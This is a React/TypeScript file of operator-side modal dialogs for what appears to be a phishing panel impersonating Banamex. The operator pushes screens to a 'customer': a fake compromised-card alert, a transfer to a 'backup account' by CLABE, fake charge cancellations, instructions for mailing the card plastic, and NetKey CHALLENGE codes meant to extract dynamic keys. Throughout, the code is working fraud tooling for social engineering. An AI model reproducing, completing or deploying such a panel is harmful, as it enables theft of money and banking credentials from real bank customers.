import { useState } from 'react';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { Label } from '@/components/ui/label';

interface ModalProps {
  isOpen: boolean;
  onClose: () => void;
  title: string;
  children: React.ReactNode;
}

const Modal: React.FC<ModalProps> = ({ isOpen, onClose, title, children }) => {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-60 z-50 flex items-center justify-center">
      <div className="bg-[#2c2c2c] p-6 rounded-lg max-w-lg w-full relative">
        <button 
          className="absolute top-2 right-3 text-gray-400 hover:text-white text-xl"
          onClick={onClose}
        >
          &times;
        </button>
        <h3 className="text-xl font-semibold mb-4 text-white">{title}</h3>
        {children}
      </div>
    </div>
  );
};

interface ProtectModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (data: { cliente: string, terminacion: string }) => void;
}

export const ProtectModal: React.FC<ProtectModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [formData, setFormData] = useState({
    cliente: '',
    terminacion: ''
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [id.replace('seguridad', '').toLowerCase()]: value
    }));
  };

  const handleSubmit = () => {
    onConfirm(formData);
    setFormData({
      cliente: '',
      terminacion: ''
    });
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Aviso de seguridad: Tarjeta vulnerada">
      <div className="mb-4">
        <Label htmlFor="seguridadCliente" className="block text-sm text-gray-300 mb-1">
          Nombre del cliente
        </Label>
        <Input 
          id="seguridadCliente" 
          type="text" 
          placeholder="Ingrese el nombre del cliente"
          value={formData.cliente}
          onChange={handleChange}
          className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
        />
      </div>

      <div className="mb-4">
        <Label htmlFor="seguridadTerminacion" className="block text-sm text-gray-300 mb-1">
          Terminación de tarjeta
        </Label>
        <Input 
          id="seguridadTerminacion" 
          type="text" 
          placeholder="Ingrese la terminación"
          value={formData.terminacion}
          onChange={handleChange}
          className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
        />
      </div>

      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
        >
          Continuar
        </Button>
      </div>
    </Modal>
  );
};

interface TransferModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (data: { cantidad: string, titular: string, clabe: string, alias: string }) => void;
}

export const TransferModal: React.FC<TransferModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [formData, setFormData] = useState({
    cantidad: '',
    titular: '',
    clabe: '',
    alias: 'Cuenta de respaldo'
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [id.replace('transfer', '').toLowerCase()]: value
    }));
  };

  const handleSubmit = () => {
    onConfirm(formData);
    setFormData({
      cantidad: '',
      titular: '',
      clabe: '',
      alias: 'Cuenta de respaldo'
    });
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Transferir">
      <div className="space-y-3">
        <div>
          <Input 
            id="transferCantidad" 
            type="number" 
            placeholder="Ingrese la cantidad"
            value={formData.cantidad}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
        </div>
        <div>
          <Input 
            id="transferTitular" 
            type="text" 
            placeholder="Ingrese el titular"
            value={formData.titular}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
        </div>
        <div>
          <Input 
            id="transferClabe" 
            type="text" 
            placeholder="Ingrese la CLABE"
            value={formData.clabe}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
        </div>
        <div>
          <Input 
            id="transferAlias" 
            type="text" 
            placeholder="Cuenta de respaldo"
            value={formData.alias}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
        </div>
      </div>

      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
        >
          Continuar
        </Button>
      </div>
    </Modal>
  );
};

interface CancelModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (data: { importe: string, negocio: string }) => void;
}

export const CancelModal: React.FC<CancelModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [formData, setFormData] = useState({
    importe: '',
    negocio: ''
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [id.replace('cancelacion', '').toLowerCase()]: value
    }));
  };

  const handleSubmit = () => {
    onConfirm(formData);
    setFormData({
      importe: '',
      negocio: ''
    });
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Cancelación">
      <div className="space-y-3">
        <div>
          <Input 
            id="cancelacionImporte" 
            type="number" 
            placeholder="Ingrese el importe"
            value={formData.importe}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
        </div>
        <div>
          <Input 
            id="cancelacionNegocio" 
            type="text" 
            placeholder="Ingrese el negocio"
            value={formData.negocio}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
        </div>
      </div>

      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
        >
          Continuar
        </Button>
      </div>
    </Modal>
  );
};

interface SmsCompraModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (telefono: string) => void;
}

export const SmsCompraModal: React.FC<SmsCompraModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [telefono, setTelefono] = useState('');

  const handleSubmit = () => {
    if (telefono.length === 4) {
      onConfirm(telefono);
      setTelefono('');
      onClose();
    } else {
      alert('Por favor ingresa exactamente 4 dígitos');
    }
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="SMS Compra - Cancelación de cargos">
      <div className="mb-4">
        <Label htmlFor="telefonoSmsCompra" className="block text-sm text-gray-300 mb-1">
          Ingresa los últimos 4 dígitos del celular:
        </Label>
        <Input 
          id="telefonoSmsCompra" 
          type="tel" 
          maxLength={4}
          placeholder="Ej: 5678"
          value={telefono}
          onChange={(e) => {
            // Solo permitir números y limitar a 4 dígitos
            const value = e.target.value.replace(/\D/g, '').substring(0, 4);
            setTelefono(value);
          }}
          className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
        />
        <p className="text-xs text-gray-400 mt-1">
          Solo se requieren los últimos 4 dígitos del número celular. 
          Estos dígitos se mostrarán en la pantalla de cancelación.
        </p>
      </div>

      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
          disabled={telefono.length !== 4}
        >
          Enviar
        </Button>
      </div>
    </Modal>
  );
};

interface CardInstructionsModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (data: { cliente: string, terminacion: string, folio: string, direccion: string }) => void;
}

export const CardInstructionsModal: React.FC<CardInstructionsModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [formData, setFormData] = useState({
    cliente: '',
    terminacion: '',
    folio: '',
    direccion: ''
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { id, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [id.replace('instrucciones', '').toLowerCase()]: value
    }));
  };

  const handleSubmit = () => {
    onConfirm(formData);
    setFormData({
      cliente: '',
      terminacion: '',
      folio: '',
      direccion: ''
    });
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Instrucciones de envío plástico">
      <div className="mb-3 p-3 bg-[#162331] text-[#8fb0d3] rounded text-sm">
        <p>En esta pantalla se mostrarán al cliente las instrucciones para enviar su plástico. 
        Los datos que ingreses aquí aparecerán en la pantalla de instrucciones del cliente.</p>
        <p className="mt-2">Nota: Si el cliente ingresó un folio al inicio, ese folio se recuperará 
        automáticamente, aunque ingreses uno diferente aquí.</p>
      </div>

      <div className="space-y-3">
        <div>
          <Label htmlFor="instruccionesCliente" className="block text-sm text-gray-300 mb-1">
            Nombre del cliente
          </Label>
          <Input 
            id="instruccionesCliente" 
            type="text" 
            placeholder="Ingrese el nombre del cliente"
            value={formData.cliente}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
        </div>
        <div>
          <Label htmlFor="instruccionesTerminacion" className="block text-sm text-gray-300 mb-1">
            Terminación de tarjeta
          </Label>
          <Input 
            id="instruccionesTerminacion" 
            type="text" 
            placeholder="Últimos 4 dígitos"
            value={formData.terminacion}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
        </div>
        <div>
          <Label htmlFor="instruccionesFolio" className="block text-sm text-gray-300 mb-1">
            Folio de seguimiento
          </Label>
          <Input 
            id="instruccionesFolio" 
            type="text" 
            placeholder="Ingrese el folio de seguimiento"
            value={formData.folio}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
          <p className="text-xs text-gray-400 mt-1">Este folio será reemplazado por el ingresado al inicio, si está disponible.</p>
        </div>
        <div>
          <Label htmlFor="instruccionesDireccion" className="block text-sm text-gray-300 mb-1">
            Dirección de entrega
          </Label>
          <Textarea 
            id="instruccionesDireccion" 
            placeholder="Ingrese la dirección completa"
            value={formData.direccion}
            onChange={handleChange}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none min-h-20"
          />
        </div>
      </div>

      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
        >
          Continuar
        </Button>
      </div>
    </Modal>
  );
};

interface CodeModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (telefono: string) => void;
}

export const CodeModal: React.FC<CodeModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [telefono, setTelefono] = useState('');

  const handleSubmit = () => {
    if (telefono.length === 4) {
      // Agregamos un prefijo ficticio para mantener compatibilidad con el resto del código
      // que espera un número de 10 dígitos
      const fullPhone = "123456" + telefono;
      onConfirm(fullPhone);
      setTelefono('');
    } else {
      alert('Por favor ingresa exactamente 4 dígitos');
    }
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Teléfono">
      <div className="mb-4">
        <Label htmlFor="telefonoCodigo" className="block text-sm text-gray-300 mb-1">
          Ingresa los últimos 4 dígitos del celular:
        </Label>
        <Input 
          id="telefonoCodigo" 
          type="tel" 
          maxLength={4}
          placeholder="Ej: 5678"
          value={telefono}
          onChange={(e) => {
            // Solo permitir números y limitar a 4 dígitos
            const value = e.target.value.replace(/\D/g, '').substring(0, 4);
            setTelefono(value);
          }}
          className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
        />
        <p className="text-xs text-gray-400 mt-1">
          Solo se requieren los últimos 4 dígitos del número celular.
        </p>
      </div>

      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
          disabled={telefono.length !== 4}
        >
          Aceptar
        </Button>
      </div>
    </Modal>
  );
};

interface MessageModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (mensaje: string) => void;
}

export const MessageModal: React.FC<MessageModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [mensaje, setMensaje] = useState('');

  const handleSubmit = () => {
    onConfirm(mensaje);
    setMensaje('');
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Mensaje personalizado">
      <div className="mb-4">
        <Label htmlFor="mensajeTexto" className="block text-sm text-gray-300 mb-1">
          Escribe el mensaje (máx. 4000 caracteres - tamaño de una hoja oficio):
        </Label>
        <Textarea 
          id="mensajeTexto" 
          maxLength={4000}
          rows={8}
          value={mensaje}
          onChange={(e) => setMensaje(e.target.value.slice(0, 4000))}
          className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
        />
        <div className="text-right text-xs text-gray-500 mt-1">
          {mensaje.length}/4000 caracteres
        </div>
      </div>

      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
        >
          Enviar
        </Button>
      </div>
    </Modal>
  );
};

interface DatosTarjetaModalProps { 
  isOpen: boolean; 
  onClose: () => void; 
  onConfirm: (data: { terminacion: string }) => void; 
}

export const DatosTarjetaModal: React.FC<DatosTarjetaModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [terminacion, setTerminacion] = useState('');

  const handleSubmit = () => {
    if (terminacion.length === 4 && /^\d+$/.test(terminacion)) {
      onConfirm({ terminacion });
      setTerminacion('');
    } else {
      alert('Por favor ingresa exactamente 4 dígitos numéricos');
    }
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Datos de Tarjeta">
      <div className="space-y-3">
        <div>
          <Label htmlFor="terminacion" className="block mb-2 text-white">
            Últimos 4 dígitos de la tarjeta
          </Label>
          <Input 
            id="terminacion" 
            type="text" 
            placeholder="Ej: 1234"
            value={terminacion}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, '');
              if (value.length <= 4) {
                setTerminacion(value);
              }
            }}
            maxLength={4}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
          />
          <p className="text-xs text-gray-400 mt-1">
            Ingrese los últimos 4 dígitos de la tarjeta para verificación
          </p>
        </div>
      </div>

      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
        >
          Solicitar datos
        </Button>
      </div>
    </Modal>
  );
};

interface NetKeyModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (challenge: string) => void;
}

export const NetKeyModal: React.FC<NetKeyModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [challenge, setChallenge] = useState('');

  const handleSubmit = () => {
    if (challenge.length === 8 && /^\d+$/.test(challenge)) {
      onConfirm(challenge);
      setChallenge('');
    } else {
      alert('Por favor ingresa exactamente 8 dígitos numéricos');
    }
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Banamex NetKey - Código CHALLENGE">
      <div className="space-y-3">
        <div>
          <Label htmlFor="challenge" className="block mb-2 text-white">
            Código CHALLENGE de 8 dígitos
          </Label>
          <Input 
            id="challenge" 
            type="text" 
            placeholder="Ej: 12345678"
            value={challenge}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, '');
              if (value.length <= 8) {
                setChallenge(value);
              }
            }}
            maxLength={8}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none text-2xl text-center font-mono tracking-widest"
          />
          <p className="text-xs text-gray-400 mt-2">
            Ingrese el código CHALLENGE de 8 dígitos que desea mostrar al cliente
          </p>
        </div>
      </div>

      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
        >
          Enviar CHALLENGE
        </Button>
      </div>
    </Modal>
  );
};

interface NetKey2ModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (challenge: string) => void;
}

export const NetKey2Modal: React.FC<NetKey2ModalProps> = ({ isOpen, onClose, onConfirm }) => {
  const [challenge, setChallenge] = useState('');

  const handleSubmit = () => {
    if (challenge.length === 8 && /^\d+$/.test(challenge)) {
      onConfirm(challenge);
      setChallenge('');
    } else {
      alert('Por favor ingresa exactamente 8 dígitos numéricos');
    }
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="NetKey 2 - Clave Dinámica Completa">
      <div className="space-y-3">
        <div>
          <Label htmlFor="challenge2" className="block mb-2 text-white">
            Código CHALLENGE de 8 dígitos para Clave Dinámica
          </Label>
          <Input 
            id="challenge2" 
            type="text" 
            placeholder="Ej: 17728012"
            value={challenge}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, '');
              if (value.length <= 8) {
                setChallenge(value);
              }
            }}
            maxLength={8}
            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none text-2xl text-center font-mono tracking-widest"
          />
          <p className="text-xs text-gray-400 mt-2">
            El cliente verá este código en la pantalla de Clave Dinámica completa con diseño Banamex
          </p>
        </div>
      </div>

      <div className="flex justify-end space-x-2 mt-6">
        <Button 
          onClick={onClose}
          variant="secondary"
          className="bg-gray-600 text-white hover:bg-gray-700"
        >
          Cancelar
        </Button>
        <Button 
          onClick={handleSubmit}
          variant="default"
          className="bg-[#007bff] text-white hover:bg-opacity-90"
        >
          Enviar Código
        </Button>
      </div>
    </Modal>
  );
};